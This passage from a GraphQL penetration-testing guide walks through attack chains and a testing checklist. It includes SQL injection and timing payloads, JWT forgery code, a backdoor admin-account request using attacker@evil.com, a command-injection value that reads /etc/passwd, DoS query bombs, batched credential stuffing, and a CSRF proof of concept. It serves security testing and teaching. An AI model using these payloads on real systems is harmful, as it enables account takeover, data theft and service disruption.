vulnerabilities to achieve significant security breaches. These scenarios can be tested manually using Burp Suite.</p>\n<h3>Scenario 1: Information Disclosure to Account Takeover</h3>\n<p>This attack chain demonstrates how GraphQL vulnerabilities can be combined to progress from initial information disclosure to full account takeover:</p>\n<ol>\n<li><strong>Initial Reconnaissance</strong>: The attacker uses introspection to discover the schema structure.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  __schema {\n    types {\n      name\n      kind\n      fields {\n        name\n      }\n    }\n  }\n}\n</code></pre>\n<ol start=\"2\">\n<li><strong>Identify User Query</strong>: The attacker discovers a <code>user</code> query that takes a username parameter.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  user(username: \"admin\") {\n    id\n    username\n    email\n  }\n}\n</code></pre>\n<ol start=\"3\">\n<li><strong>Exploiting Over-fetching</strong>: The attacker discovers they can request additional fields beyond what the UI normally shows.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  user(username: \"admin\") {\n    id\n    username\n    email\n    resetToken  # Sensitive field not intended for user access\n    lastLogin\n    role\n  }\n}\n</code></pre>\n<ol start=\"4\">\n<li><strong>Enumerating Users</strong>: The attacker uses batching to efficiently enumerate valid usernames.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">[\n  { \"query\": \"query { user(username: \\\"admin\\\") { id } }\" },\n  { \"query\": \"query { user(username: \\\"john\\\") { id } }\" },\n  { \"query\": \"query { user(username: \\\"sarah\\\") { id } }\" },\n  # ... many more\n]\n</code></pre>\n<ol start=\"5\">\n<li><strong>SQL Injection to Retrieve Password Hashes</strong>: The attacker discovers a SQL injection vulnerability in the user query.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  user(username: \"admin' UNION SELECT id, username, password_hash as email, 'token' as resetToken FROM users --\") {\n    id\n    username\n    email  # This will contain password hashes\n    resetToken\n  }\n}\n</code></pre>\n<ol start=\"6\">\n<li><strong>Password Reset Manipulation</strong>: Using the discovered SQL injection, the attacker manages to reset a user's password by manipulating the resetToken field.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">mutation {\n  resetPassword(input: {\n    username: \"admin\",\n    token: \"STOLEN_OR_GENERATED_TOKEN\",\n    newPassword: \"hacked_password\"\n  }) {\n    success\n  }\n}\n</code></pre>\n<ol start=\"7\">\n<li><strong>Account Takeover</strong>: With the password reset, the attacker now has full control of the admin account.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">mutation {\n  login(username: \"admin\", password: \"hacked_password\") {\n    token\n    user {\n      id\n      role\n    }\n  }\n}\n</code></pre>\n<h3>Scenario 2: DoS to Data Exfiltration</h3>\n<p>This attack chain shows how DoS techniques can be leveraged for data exfiltration:</p>\n<ol>\n<li><strong>Identifying Expensive Operations</strong>: The attacker identifies resource-intensive operations.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  searchProducts(keyword: \"\") {  # Empty search returns all products\n    id\n    name\n    price\n  }\n}\n</code></pre>\n<ol start=\"2\">\n<li><strong>Creating DoS Conditions</strong>: The attacker creates a nested query that puts significant load on the server.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  categories {\n    products(first: 1000) {\n      reviews(first: 1000) {\n        user {\n          posts(first: 1000) {\n            comments(first: 1000) {\n              id\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre>\n<ol start=\"3\">\n<li><strong>Timing Attack Preparation</strong>: While the server is under heavy load, the attacker prepares timing-based attacks to extract data.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  # First, create heavy load\n  search1: searchProducts(keyword: \"\") { id }\n  \n  # Then attempt a timing attack\n  user(username: \"admin' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END from users where username='admin') --\") {\n    id\n  }\n}\n</code></pre>\n<ol start=\"4\">\n<li><strong>Manual Timing Attack Execution</strong>:\n<ul>\n<li>Configure Burp Repeater to send a request containing both a DoS component and an SQL injection with timing components</li>\n<li>Send requests with different character guesses (a-z, 0-9)</li>\n<li>Measure the response time for each character</li>\n<li>When response time is significantly longer, you've identified the correct character</li>\n<li>Repeat for each position in the target data</li>\n</ul>\n</li>\n</ol>\n<h3>Scenario 3: Chaining Multiple Vulnerabilities for Privilege Escalation</h3>\n<p>This attack chain demonstrates a sophisticated privilege escalation:</p>\n<ol>\n<li><strong>Initial Access</strong>: The attacker starts with a low-privileged account.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">mutation {\n  login(username: \"regular_user\", password: \"password123\") {\n    token\n  }\n}\n</code></pre>\n<ol start=\"2\">\n<li><strong>Information Gathering</strong>: The attacker uses overfetching to discover admin accounts.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  users {\n    id\n    username\n    role\n    email\n  }\n}\n</code></pre>\n<ol start=\"3\">\n<li><strong>Exploiting Broken Authentication</strong>: The attacker finds a manipulation vulnerability in the login mutation.</li>\n</ol>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">mutation {\n  login(username: \"regular_user\", password: \"password123\") {\n    token\n    # Forcing fields that might not be properly protected\n    user {\n      id\n      role\n      permissions\n    }\n  }\n}\n</code></pre>\n<ol start=\"4\">\n<li>\n<p><strong>JWT Analysis</strong>:</p>\n<ul>\n<li>Use the JWT token from the response</li>\n<li>Decode it using Burp's JWT Editor extension or an online tool like jwt.io</li>\n<li>Examine the payload for editable claims:\n<pre class=\"language-javascript\"><code class=\"language-javascript\">// Decoded JWT payload\n{\n  \"sub\": \"123\",\n  \"username\": \"regular_user\",\n  \"role\": \"user\",\n  \"iat\": 1650000000,\n  \"exp\": 1650086400\n}\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>JWT Manipulation</strong>:</p>\n<ul>\n<li>If the token uses a weak algorithm (like HS256), attempt to modify the role claim</li>\n<li>Try common secrets using Burp's JWT Editor extension</li>\n<li>If successful, you'll get a new token with admin privileges</li>\n</ul>\n</li>\n<li>\n<p><strong>Testing Privileged Access</strong>:</p>\n<ul>\n<li>Use the forged token in Burp Repeater</li>\n<li>Attempt to access admin-only functionality:\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer FORGED_TOKEN\n\n{\"query\": \"mutation { deleteUser(id: \\\"456\\\") { success } }\"}\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Creating Backdoor Account</strong>:</p>\n<ul>\n<li>If the forged token works, create a new admin account for persistent access:\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer FORGED_TOKEN\n\n{\"query\": \"mutation { createUser(input: { username: \\\"backup_admin\\\", password: \\\"evil_password\\\", email: \\\"attacker@evil.com\\\", role: \\\"admin\\\" }) { id role } }\"}\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n<h2>GraphQL Security Testing Tools</h2>\n<p>Several specialized tools can help test GraphQL security:</p>\n<h3>InQL</h3>\n<p>InQL is a Burp Suite extension specifically designed for GraphQL security testing:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Installing InQL Scanner CLI\npip install inql\n\n# Running a basic scan\ninql -t https://api.example.com/graphql\n\n# Dumping schema and generating queries\ninql -t https://api.example.com/graphql -d schema_dump -g\n</code></pre>\n<h3>GraphQL Voyager</h3>\n<p>GraphQL Voyager creates visual representations of your schema, helping identify security issues:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Installing GraphQL Voyager\nnpm install -g graphql-voyager\n\n# Usage with a local schema file\nvoyager --url https://api.example.com/graphql\n</code></pre>\n<h3>Altair GraphQL Client</h3>\n<p>Altair provides a sophisticated interface for GraphQL testing:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># Installing Altair CLI\nnpm install -g altair-graphql-client\n\n# Running Altair\naltair\n</code></pre>\n<h3>Custom Security Testing with Burp Suite</h3>\n<p>For comprehensive security testing, you can leverage Burp Suite Professional's built-in tools:</p>\n<h4>1. Setting up a GraphQL testing project in Burp Suite</h4>\n<ol>\n<li>\n<p><strong>Create a new Burp project</strong>:</p>\n<ul>\n<li>Launch Burp Suite Professional</li>\n<li>Create a new project dedicated to GraphQL testing</li>\n<li>Configure your browser to proxy through Burp (default: 127.0.0.1:8080)</li>\n</ul>\n</li>\n<li>\n<p><strong>Install GraphQL-specific extensions</strong>:</p>\n<ul>\n<li>Go to the \"Extensions\" tab</li>\n<li>Browse the BApp Store</li>\n<li>Install \"InQL - Introspection GraphQL Scanner\"</li>\n<li>Install \"GraphQL Raider\" if available</li>\n<li>Install \"JSON Web Tokens\" for testing JWT authentication</li>\n</ul>\n</li>\n<li>\n<p><strong>Configure target scope</strong>:</p>\n<ul>\n<li>In the \"Target\" tab, add the GraphQL API endpoint to scope</li>\n<li>Configure appropriate exclusions for any irrelevant paths</li>\n</ul>\n</li>\n</ol>\n<h4>2. Systematically testing for vulnerabilities</h4>\n<p>Create a testing checklist in Burp Suite:</p>\n<ol>\n<li>\n<p><strong>Reconnaissance phase</strong>:</p>\n<ul>\n<li>Use InQL to perform introspection and map the schema</li>\n<li>Save discovered queries and mutations for later testing</li>\n<li>Document sensitive fields and operations</li>\n</ul>\n</li>\n<li>\n<p><strong>Authentication testing</strong>:</p>\n<ul>\n<li>Test JWT tokens using the JWT Editor</li>\n<li>Check for token tampering vulnerabilities</li>\n<li>Verify token signature validation</li>\n</ul>\n</li>\n<li>\n<p><strong>Authorization testing</strong>:</p>\n<ul>\n<li>Create test cases in Repeater for each permission level</li>\n<li>Test field-level authorization with different user roles</li>\n<li>Document authorization bypasses</li>\n</ul>\n</li>\n<li>\n<p><strong>Injection testing</strong>:</p>\n<ul>\n<li>Use Intruder to test SQL and NoSQL injection points</li>\n<li>Save successful payloads as session handling rules</li>\n<li>Use Active Scan with appropriate configurations</li>\n</ul>\n</li>\n<li>\n<p><strong>DoS and performance testing</strong>:</p>\n<ul>\n<li>Create complex nested queries in Repeater</li>\n<li>Test batching limitations</li>\n<li>Document response times for various query types</li>\n</ul>\n</li>\n<li>\n<p><strong>CSRF testing</strong>:</p>\n<ul>\n<li>Generate CSRF PoCs using Burp's built-in generator</li>\n<li>Test both GET and POST-based CSRF</li>\n<li>Verify anti-CSRF token implementations</li>\n</ul>\n</li>\n</ol>\n<h4>3. Documenting findings with Burp Suite</h4>\n<ol>\n<li>\n<p><strong>Use Burp's built-in reporting</strong>:</p>\n<ul>\n<li>Add issues to the \"Issues\" tab</li>\n<li>Include detailed reproduction steps</li>\n<li>Classify by severity and confidence</li>\n</ul>\n</li>\n<li>\n<p><strong>Leverage Burp's session handling</strong>:</p>\n<ul>\n<li>Create session handling rules for authenticated testing</li>\n<li>Store and reuse authentication tokens</li>\n<li>Create macros for multi-step exploits</li>\n</ul>\n</li>\n<li>\n<p><strong>Save your project</strong>:</p>\n<ul>\n<li>Maintain a persistent Burp project for the target</li>\n<li>Document progress in the project</li>\n<li>Export findings for reporting</li>\n</ul>\n</li>\n</ol>\n<p>By using Burp Suite's comprehensive toolset, you can methodically test GraphQL APIs for security vulnerabilities without relying on custom scripts, making the testing process more standardized and repeatable.</p>\n<h2>The Complete GraphQL Testing Methodology</h2>\n<p>Let's expand on our testing approach with a comprehensive, step-by-step checklist specifically designed for GraphQL APIs. This methodology has been battle-tested on dozens of real-world GraphQL implementations.</p>\n<h3>1. Initial GraphQL Endpoint Discovery</h3>\n<p>Before you can test a GraphQL API, you need to find it. Look for these common endpoint patterns:</p>\n<ul>\n<li><code>/graphql</code> - The most common endpoint</li>\n<li><code>/api/graphql</code> - Often used in structured APIs</li>\n<li><code>/query</code> - Sometimes used as an alias</li>\n<li><code>/graphiql</code> or <code>/playground</code> - Development interfaces that might be left enabled</li>\n<li><code>/v1/graphql</code> or similar versioned endpoints</li>\n</ul>\n<p>Discovery techniques:</p>\n<pre class=\"language-none\"><code class=\"language-none\"># Directory brute-forcing\nffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -e .php,.graphql,.gql\n\n# Check JS files for GraphQL endpoints\ngrep -r \"graphql\\|gql\" --include=\"*.js\" .\n\n# Look for GraphQL specific HTTP headers\ncurl -I https://target.com/api/graphql\n</code></pre>\n<p>Pro tip: Many applications expose GraphQL at multiple endpoints - one public and documented, others internal and potentially less secured.</p>\n<h3>2. Introspection Testing</h3>\n<p>Once you've found the endpoint, test if introspection is enabled:</p>\n<ol>\n<li>\n<p><strong>Basic introspection check</strong>:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  __schema {\n    types {\n      name\n    }\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong>If introspection succeeds, follow up with comprehensive mapping</strong>:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query IntrospectionQuery {\n  __schema {\n    queryType { name }\n    mutationType { name }\n    subscriptionType { name }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type { ...TypeRef }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong>Document all operations by category</strong>:</p>\n<ul>\n<li>User data operations (queries/mutations that handle user info)</li>\n<li>Authentication operations (login, token refresh, etc.)</li>\n<li>Administrative operations (user management, settings, etc.)</li>\n<li>Business logic operations (specific to the application)</li>\n</ul>\n</li>\n<li>\n<p><strong>If introspection is disabled, try these bypasses</strong>:</p>\n<ul>\n<li>URI case manipulation: <code>/GraphQL</code> instead of <code>/graphql</code></li>\n<li>Add custom headers: <code>X-Apollo-Tracing: 1</code></li>\n<li>Try partial introspection: <code>{ __type(name: \"User\") { name fields { name type { name } } } }</code></li>\n<li>Look for introspection data in JS bundles (search for \"queryType\" or \"mutationType\")</li>\n<li>Try accessing development environment URLs (staging, dev, etc.)</li>\n</ul>\n</li>\n</ol>\n<p>InQL in Burp automates most of this, but manual exploration often reveals endpoints that automated tools miss.</p>\n<h3>3. Authentication Testing</h3>\n<p>GraphQL APIs often have unique authentication vulnerabilities:</p>\n<ol>\n<li>\n<p><strong>JWT token attacks</strong>:</p>\n<ul>\n<li>Check for weak signature verification (alg:none, RS/HS256 confusion)</li>\n<li>Test token reuse across environments</li>\n<li>Look for sensitive data in token claims</li>\n<li>Try token replay without expiration</li>\n<li>Test for missing validation of token claims</li>\n</ul>\n<p>Example attack query with forged token:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\nContent-Type: application/json\n\n{\"query\": \"query { adminSettings { serverConfig } }\"}\n</code></pre>\n<p>JWT forgery techniques:</p>\n<pre class=\"language-python\"><code class=\"language-python\"># Algorithm confusion attack (RS256 to HS256)\n# 1. Decode the token without verification\nimport jwt\ntoken = \"eyJhbGciO...\"\nheader = jwt.get_unverified_header(token)\npayload = jwt.decode(token, options={\"verify_signature\": False})\n\n# 2. Modify claims\npayload[\"role\"] = \"admin\"\n\n# 3. Change algorithm from RS256 to HS256 and sign with the public key\n# This works when the server doesn't validate the algorithm properly\nimport base64\nwith open(\"public_key.pem\", \"rb\") as f:\n    public_key = f.read()\n\n# Create forged token with HS256 algorithm using public key as the secret\nforged = jwt.encode(payload, public_key, algorithm=\"HS256\", headers={\"alg\": \"HS256\"})\n\n# Another technique: \"none\" algorithm attack\nnull_signed = jwt.encode(payload, \"\", algorithm=\"none\", headers={\"alg\": \"none\"})\n</code></pre>\n<p>Common JWT vulnerabilities:</p>\n<ul>\n<li>Key disclosure in source code or JS files</li>\n<li>Common/default secrets (\"secret\", \"key\", \"SECRET_KEY\")</li>\n<li>Improper validation of \"kid\" header claim (path traversal)</li>\n<li>Missing algorithm validation (\"alg\": \"none\" attacks)</li>\n</ul>\n</li>\n<li>\n<p><strong>Session handling tests</strong>:</p>\n<ul>\n<li>Test session fixation vulnerabilities</li>\n<li>Check if authentication state persists after logout</li>\n<li>Test for race conditions in authentication flows</li>\n<li>Check for missing invalidation of refresh tokens</li>\n</ul>\n</li>\n<li>\n<p><strong>OAuth integration vulnerabilities</strong>:</p>\n<ul>\n<li>Test for SSRF in OAuth callbacks</li>\n<li>Check for improper state validation</li>\n<li>Look for token leakage in logs or URLs</li>\n</ul>\n</li>\n</ol>\n<h3>4. Authorization Testing</h3>\n<p>Authorization bugs are extremely common in GraphQL APIs:</p>\n<ol>\n<li>\n<p><strong>Create multiple test users with different permission levels</strong>:</p>\n<ul>\n<li>Admin/superuser</li>\n<li>Regular user</li>\n<li>Restricted user</li>\n<li>Unauthenticated access</li>\n</ul>\n</li>\n<li>\n<p><strong>Object-level authorization tests</strong>:</p>\n<ul>\n<li>Attempt to access objects owned by other users</li>\n<li>Test direct object reference vulnerabilities</li>\n<li>Check for horizontal privilege escalation</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  # Attempt to access another user's data\n  user(id: \"victim_id\") {\n    email\n    profile {\n      address\n      phoneNumber\n    }\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong>Field-level authorization tests</strong>:</p>\n<ul>\n<li>Identify sensitive fields (PII, financial data, etc.)</li>\n<li>Test access to these fields across different user roles</li>\n<li>Try accessing deprecated fields (often missed in access controls)</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  # Try to access sensitive fields\n  currentUser {\n    username\n    email\n    hashedPassword # Might be exposed!\n    internalNotes # Often overlooked in access controls\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong>Role-based authorization tests</strong>:</p>\n<ul>\n<li>Try to perform admin mutations as regular user</li>\n<li>Check for missing authorization on custom operations</li>\n<li>Test newly added fields which might be missed in authorization logic</li>\n</ul>\n</li>\n<li>\n<p><strong>Common bypasses to try</strong>:</p>\n<ul>\n<li>Use aliases to request the same field multiple ways</li>\n<li>Try camelCase variations of field names</li>\n<li>Use fragments to obscure sensitive field requests</li>\n<li>Use introspection to find non-UI fields that might lack authorization checks</li>\n</ul>\n</li>\n</ol>\n<h3>5. Injection Testing</h3>\n<p>GraphQL resolvers often pass data directly to underlying systems, creating injection opportunities:</p>\n<ol>\n<li>\n<p><strong>SQL injection via GraphQL</strong>:</p>\n<ul>\n<li>Test string parameters in queries/mutations</li>\n<li>Try classic SQL injection payloads adapted for GraphQL</li>\n<li>Use Burp Intruder with GraphQL-specific payload positions</li>\n</ul>\n<p>Example in Burp Repeater:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"query\": \"query { user(username: \\\"admin' OR 1=1 --\\\") { id username email } }\"}\n</code></pre>\n</li>\n<li>\n<p><strong>NoSQL injection</strong>:</p>\n<ul>\n<li>Test for MongoDB operator injection</li>\n<li>Try JSON parameter pollution in arguments</li>\n</ul>\n<p>Example (some implementations pass objects directly to MongoDB):</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\"># This often doesn't work directly because GraphQL validates the type\nquery {\n  user(username: {$ne: null}) {\n    id\n    username\n    email\n  }\n}\n\n# More realistic payloads using string manipulation or variables\n# 1. Using string formatting to pass MongoDB operators\nquery {\n  user(username: \"admin', $or: [ {}, { 'a':'a\") {\n    id\n    username\n  }\n}\n\n# 2. Using variables and JSON objects when variables aren't properly sanitized\nquery ($username: JSON) {\n  findUser(criteria: $username) {\n    id\n    email\n  }\n}\n</code></pre>\n<p>Variables payload:</p>\n<pre class=\"language-json\"><code class=\"language-json\">{\n  \"username\": {\n    \"$ne\": null,\n    \"$regex\": \"^adm\"\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong>OS command injection</strong>:</p>\n<ul>\n<li>Target mutations that might trigger server processes</li>\n<li>Focus on file upload operations, URL processing, or system integration points</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">mutation {\n  generateReport(format: \"pdf; cat /etc/passwd #\") {\n    downloadUrl\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong>Template injection</strong>:</p>\n<ul>\n<li>Look for operations that might use templates (email, exports, reports)</li>\n<li>Test for SSTI in string parameters</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">mutation {\n  sendEmail(template: \"Welcome, {{user.name}}! {{7*7}}\", to: \"test@example.com\") {\n    success\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong>GraphQL-specific injection</strong>:</p>\n<ul>\n<li>Try injecting fragments</li>\n<li>Test for query batching issues</li>\n<li>Look for variable injection points</li>\n</ul>\n</li>\n<li>\n<p><strong>Variable coercion attacks</strong>:</p>\n<ul>\n<li>Exploit type conversion in GraphQL by providing unexpected types</li>\n<li>Test Boolean/String/Int conversions for logic bypasses</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query ($isAdmin: Boolean!) {\n  userInfo(includePrivate: $isAdmin) {\n    email\n    ssn\n    salary\n  }\n}\n</code></pre>\n<p>Send with variables: <code>{\"isAdmin\": \"true\"}</code> instead of <code>{\"isAdmin\": true}</code></p>\n<p>Why this works:\nDepending on the GraphQL implementation and resolver code, type coercion may happen differently:</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">// Vulnerable implementation in JavaScript\nfunction userInfoResolver(parent, args, context) {\n  // The implementation uses loose equality (==) instead of strict (===)\n  // \"true\" == true evaluates to true in JavaScript\n  if (args.includePrivate == true &#x26;&#x26; !context.user.isAdmin) {\n    throw new Error(\"Unauthorized\");\n  }\n  \n  // Or using Boolean() which converts strings to boolean\n  // Boolean(\"true\") evaluates to true, Boolean(\"false\") evaluates to true too!\n  if (Boolean(args.includePrivate) &#x26;&#x26; !context.user.isAdmin) {\n    throw new Error(\"Unauthorized\");\n  }\n  \n  return db.getUserPrivateInfo(context.user.id);\n}\n</code></pre>\n<p>Additional type coercion tests:</p>\n<ul>\n<li>Input: <code>{\"limit\": \"100\"}</code> when expecting <code>Int</code></li>\n<li>Input: <code>{\"filter\": 1}</code> when expecting <code>String</code> or an object</li>\n<li>Input: <code>{\"flag\": \"0\"}</code> when expecting <code>Boolean</code></li>\n</ul>\n</li>\n</ol>\n<h3>6. DoS and Resource Exhaustion</h3>\n<p>GraphQL is particularly vulnerable to DoS attacks:</p>\n<ol>\n<li>\n<p><strong>Nested query attacks</strong>:</p>\n<ul>\n<li>Create deeply nested queries using recursive types</li>\n<li>Start with 5 levels and increase until you see performance impact</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query NestedQuery {\n  user(id: \"1\") {\n    friends {\n      friends {\n        friends {\n          friends {\n            friends {\n              friends {\n                # Keep nesting until server struggles\n                id\n                username\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong>Query complexity bombs</strong>:</p>\n<ul>\n<li>Combine nested queries with field duplication</li>\n<li>Request resource-intensive computed fields</li>\n<li>Request large result sets</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query ComplexityBomb {\n  allUsers(first: 10000) {  # Large result set\n    posts(first: 100) {     # For each user\n      comments(first: 100) { # For each post\n        author {\n          # Requesting the same expensive fields multiple times\n          activityFeed { id }\n          activityFeed { id }\n          activityFeed { id }\n          activityFeed { id }\n          # ... repeat many times\n        }\n      }\n    }\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong>Batch query flooding</strong>:</p>\n<ul>\n<li>Send multiple operations in a single request</li>\n<li>Increase batch size until you find the limit or impact</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n[\n  {\"query\": \"query { user(id: \\\"1\\\") { username } }\"},\n  {\"query\": \"query { user(id: \\\"2\\\") { username } }\"},\n  ... \n  # Repeat hundreds or thousands of times\n]\n</code></pre>\n</li>\n<li>\n<p><strong>Field duplication attacks</strong>:</p>\n<ul>\n<li>Request the same field thousands of times</li>\n<li>Focus on computationally expensive fields</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  user(id: \"1\") {\n    # Request the same field many times\n    email email email email email email\n    # ... repeat hundreds of times\n  }\n}\n</code></pre>\n</li>\n<li>\n<p><strong>Resource-intensive operations</strong>:</p>\n<ul>\n<li>Identify and target expensive operations like:\n<ul>\n<li>Search functionality</li>\n<li>Filtering large datasets</li>\n<li>Geospatial queries</li>\n<li>Data aggregation</li>\n</ul>\n</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-graphql\"><code class=\"language-graphql\">query {\n  # Full-text search with minimal query to return maximum results\n  search(query: \"a\") {\n    id\n    title\n    content\n  }\n}\n</code></pre>\n</li>\n</ol>\n<h3>7. Batching Attacks</h3>\n<p>Batch operations can be exploited for various attacks:</p>\n<ol>\n<li>\n<p><strong>Rate limit bypass</strong>:</p>\n<ul>\n<li>Identify rate-limited operations</li>\n<li>Bundle them in a single batched request</li>\n<li>Check if the rate limit applies per-request or per-operation</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n[\n  {\"query\": \"mutation { sendMessage(to: \\\"user1\\\", content: \\\"test\\\") { id } }\"},\n  {\"query\": \"mutation { sendMessage(to: \\\"user2\\\", content: \\\"test\\\") { id } }\"},\n  {\"query\": \"mutation { sendMessage(to: \\\"user3\\\", content: \\\"test\\\") { id } }\"},\n  ... # Keep adding until you exceed what would normally be rate-limited\n]\n</code></pre>\n</li>\n<li>\n<p><strong>Credential stuffing</strong>:</p>\n<ul>\n<li>Bundle multiple login attempts in one request</li>\n<li>Watch for response variations that indicate valid credentials</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n[\n  {\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"password1\\\") { token } }\"},\n  {\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"password2\\\") { token } }\"},\n  ... # Test multiple passwords in one request\n]\n</code></pre>\n</li>\n<li>\n<p><strong>Query smuggling</strong>:</p>\n<ul>\n<li>Hide malicious operations among legitimate ones</li>\n<li>Use this to bypass WAF or logging mechanisms</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-none\"><code class=\"language-none\">POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n[\n  {\"query\": \"query { publicPosts { id title } }\"}, # Legitimate operation\n  {\"query\": \"query { userEmails { email role hashedPassword } }\"}, # Malicious operation\n  {\"query\": \"query { publicEvents { id date } }\"} # Legitimate operation\n]\n</code></pre>\n</li>\n</ol>\n<h3>8. CSRF Testing</h3>\n<p>GraphQL endpoints are often vulnerable to CSRF:</p>\n<ol>\n<li>\n<p><strong>Identify state-changing mutations</strong>:</p>\n<ul>\n<li>Look for operations that update user data</li>\n<li>Focus on high-impact operations like:\n<ul>\n<li>Password/email changes</li>\n<li>Account settings</li>\n<li>Financial transactions</li>\n<li>Data deletion</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>Test for GET-based GraphQL support</strong>:</p>\n<ul>\n<li>Some implementations support queries via GET params</li>\n<li>This makes CSRF trivial</li>\n</ul>\n<p>Example:</p>\n<pre class=\"language-none\"><code class=\"language-none\">&#x3C;img src=\"https://target.com/graphql?query=mutation{changeEmail(email:%22attacker@evil.com%22){success}}\" style=\"display:none\">\n</code></pre>\n</li>\n<li>\n<p><strong>Test for missing CSRF protections</strong>:</p>\n<ul>\n<li>Check if the API relies solely on cookies for authentication</li>\n<li>Verify if CSRF tokens are validated for GraphQL operations</li>\n</ul>\n<p>Example PoC:</p>\n<pre class=\"language-html\"><code class=\"language-html\">&#x3C;html>\n  &#x3C;body onload=\"document.forms[0].submit()\">\n    &#x3C;form action=\"https://target.com/graphql\" method=\"POST\" enctype=\"text/plain\">\n      &#x3C;input name='{\"query\":\"mutation{changeEmail(email:\\\"attacker@evil.com\\\"){success}}\"}' value='abc'>\n    &#x3C;/form>\n  &#x3C;/body>\n&#x3C;/html>\n</code></pre>\n</li>\n</ol>\n<h3>9. Advanced Techniques</h3>\n<p>For hardened GraphQL APIs, try these advanced 